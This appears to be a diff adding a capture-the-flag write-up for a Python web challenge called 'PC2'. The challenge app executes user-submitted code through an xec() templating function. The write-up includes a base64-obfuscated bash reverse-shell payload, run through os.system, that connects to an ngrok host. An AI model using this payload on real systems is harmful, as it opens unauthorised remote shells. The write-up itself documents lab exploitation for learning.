@@ -155,6 +155,104 @@ Cool we got the flag
 Flag: ictf{assertion_failed_e3106922feb13b10}
 ```
 
+#### PC2
+![image](https://github.com/user-attachments/assets/116d8819-66d3-4211-b047-99acfddfbd56)
+
+As usual we are given the source which we i already downloaded
+![image](https://github.com/user-attachments/assets/ef8b62d3-4651-4f3f-90f3-471919416169)
+
+It's a python web application so let's start by checking the `Dockerfile`
+![image](https://github.com/user-attachments/assets/99e031fe-aed3-4208-a51a-803d268eb263)
+
+Nothing much here just some setups
+
+Ok so let's check the app source code
+![image](https://github.com/user-attachments/assets/839ad87b-4d76-4d88-b7e0-bde4779becc2)
+![image](https://github.com/user-attachments/assets/79ae8be4-ba76-424b-95c9-3e981babeaea)
+
+The only available route is `/` and what it does is this:
+- Retrieves the `code` body parameter if the http request method is `POST`
+- Calls function `xec()` passing the data body as the argument
+- Does some regular expression check and if the pattern check doesn't return `None` it would render the `index.html` template
+
+So far nothing interesting here
+
+Let's check the `xec` function
+- It would indent the parameter passed into the function
+- Generates a random file name based on the `md5` hash of the code content
+- Does some python templating inroder to make it a valid python code
+- Makes it executable
+- And finally runs the python code
+
+The thing of interest here is that it would use our input value and add it to a template which would be stored as a python code then executed
+
+I copied the `xec` function to know how the final python code would be based on our input and saw this
+![image](https://github.com/user-attachments/assets/9623c760-0620-486a-a831-730c8570cd56)
+
+This is how the final code would be:
+
+```
+def main():
+    print('hi')
+from parse import rgb_parse
+print(rgb_parse(main())
+```
+
+We can decide to check the `parse.rgp_parse` function but that's not needed because `main()` would be called first and it's the value returned from it that's going to be used in the function
+
+In order words because we have control over what will be executed we can inject our malicious code and it would get executed
+
+Cool!
+
+I decided to just get a reverse shell
+
+First I setup ngrok then base64 encode my reverse shell
+![image](https://github.com/user-attachments/assets/75358e96-3dee-42be-bf75-03dfdec28d15)
+
+Now i just need to use the `os` module then access the `system` function to execute shell command
+
+Here's my payload
+![image](https://github.com/user-attachments/assets/80c98104-f180-4e15-b47f-dc97006bce31)
+
+```python
+import os
+os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80LnRjcC51cy1jYWwtMS5uZ3Jvay5pby8xNTkxNCAwPiYx | base64 -d | bash')
+```
+
+Back to my netcat listener I got a reverse shell
+![image](https://github.com/user-attachments/assets/39fcafbb-b047-49be-b1e6-7df4d7af405d)
+
+```
+Flag: ictf{d1_color_picker_fr_2ce0dd3d}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
